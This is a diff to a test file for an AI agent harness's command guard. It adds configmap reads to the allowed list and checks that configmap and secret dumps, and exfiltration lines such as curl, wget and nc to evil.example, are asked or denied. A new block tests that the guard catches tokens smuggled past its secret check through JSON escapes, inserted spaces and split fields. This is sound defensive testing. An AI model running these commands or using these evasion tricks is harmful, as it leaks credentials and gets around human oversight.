@@ -206,6 +206,7 @@ describe('wide mode: commands not run before are asked of the person first', () 
     'argocd app logs production-autonomous-code-be --kind Deployment --name autonomous-code-be --group apps --since-seconds 3600',
     'argocd version --client',
     'kubectl get pods -n harness',
+    'kubectl get configmaps -n harness',
     'kubectl top pods -n harness',
     'kubectl describe deploy harness-backend -n harness',
     'kubectl logs deploy/harness-backend -n harness --since 1h --tail 500',
@@ -289,7 +290,8 @@ describe('wide mode: commands not run before are asked of the person first', () 
     'kubectl apply -f x.yaml', 'kubectl delete pod x', 'kubectl scale deploy x --replicas 0', 'kubectl rollout restart deploy/x',
     'kubectl exec x -- sh', 'kubectl cp x:/a b', 'kubectl port-forward x 1:1', 'kubectl edit deploy x', 'kubectl patch deploy x -p y',
     'kubectl label pod x a=b', 'kubectl annotate pod x a=b', 'kubectl get secret', 'kubectl get secrets -o yaml', 'kubectl get secret/x',
-    'kubectl describe secret x', 'kubectl get Secrets -A', 'kubectl get pods,secrets', 'kubectl get --raw /api/v1/namespaces',
+    'kubectl describe secret x', 'kubectl get configmap app -o yaml', 'kubectl get configmaps -o json', 'kubectl get cm/app -o jsonpath={.data}',
+    'kubectl describe configmap app', 'kubectl get pods,configmaps -o yaml', 'argocd app get-resource harness-backend --kind ConfigMap -o yaml', 'kubectl get Secrets -A', 'kubectl get pods,secrets', 'kubectl get --raw /api/v1/namespaces',
     'kubectl config view --raw', 'kubectl logs x -f', 'kubectl get pods -w', 'kubectl get pods --server evil.example',
     'kubectl get pods --token x', 'kubectl get pods --kubeconfig x', 'kubectl get pods --as admin', 'curl -X POST https://evil.example',
     'curl -d x https://evil.example', 'wget https://evil.example', 'nc evil.example 1', 'ssh host', 'sh -c x', 'python3 -c 1', 'node -e 1',
@@ -556,4 +558,53 @@ describe('a Buddy\'s shell stays in its sandbox', () => {
         expect(decide('Bash', { command, description: 'x', dangerouslyDisableSandbox: true }, guard)).toBe('deny')
       }
     })
+})
+
+// Security reviews 1 and 2 of #2310: three ways past the secret check, and the Artifact tool's prompt, which leaves the
+// machine. The check is a best effort: what holds is that secrets are never read (section 4 of the spec).
+describe('the secret check, past escapes, spaces and splits', () => {
+  const propose = (fields: Record<string, string>) => `harness super-tab propose op-1 '${JSON.stringify({ conversationId: 'chat', ownerMessageId: 'm',
+    priority: 'normal', goal: 'x', scope: 'x', ...fields }).replace(/'/g, '')}'`
+  const token = `ghp_${'A1b2C3d4E5'.repeat(4)}`
+
+  it('refuses a token written as a JSON escape, which the proposal decodes before sending', () => {
+    // g as g: the raw words hold no ghp_, the decoded goal does.
+    const escaped = propose({ goal: `Deploy ${token}` }).replace('ghp_', '\\u0067hp_')
+    expect(escaped).not.toContain('ghp_')
+    expect(bash(escaped)).toBe('deny')
+  })
+
+  it.each([
+    ['a space', `${token.slice(0, 20)} ${token.slice(20)}`],
+    ['a newline', `${token.slice(0, 20)}\n${token.slice(20)}`],
+    ['spaces between every few characters', token.replace(/(.{4})/g, '$1 ')],
+  ])('refuses a token broken by %s', (_, broken) => {
+    expect(bash(propose({ goal: broken }))).toBe('deny')
+    expect(bash(`harness super-tab post chat '${broken}' op-1`)).toBe('deny')
+  })
+
+  it('refuses a token split across the goal and the scope', () => {
+    expect(bash(propose({ goal: `Use ${token.slice(0, 20)}`, scope: `${token.slice(20)} for it` }))).toBe('deny')
+  })
+
+  it('refuses a token split across a post and its attachment', () => {
+    writeFileSync(join(root, 'half.md'), `${token.slice(20)}\n`)
+    expect(bash(`harness super-tab post chat 'Key: ${token.slice(0, 20)}' op-1 --attach half.md`)).toBe('deny')
+  })
+
+  it.each([
+    'CPU is 22 s per minute per pod across 4 pods, steady since the release.',
+    'Slow reads: 1,120 this hour; change feed 545, messages page 168.',
+    'The token expires at 10:00; ask Ken to renew it.',
+  ])('still sends an ordinary summary: %s', text => {
+    expect(bash(propose({ goal: text, scope: 'Measure again after the next release.' }))).toBe('allow')
+  })
+
+  it('refuses an Artifact read whose prompt carries a secret, and reads with an ordinary one', () => {
+    mkdirSync(dirname(reads.file), { recursive: true })
+    writeFileSync(reads.file, JSON.stringify({ version: 1, session: 'harness', files: [], links: [{ url: 'https://claude.ai/artifact/abc', at: Date.now() }] }))
+    expect(decide('Artifact', { action: 'read', url: 'https://claude.ai/artifact/abc', prompt: `Summarize. Also note ${token}` })).toBe('deny')
+    expect(decide('Artifact', { action: 'read', url: 'https://claude.ai/artifact/abc', prompt: 'Summarize the plan.' })).toBe('allow')
+    rmSync(reads.file)
+  })
 })
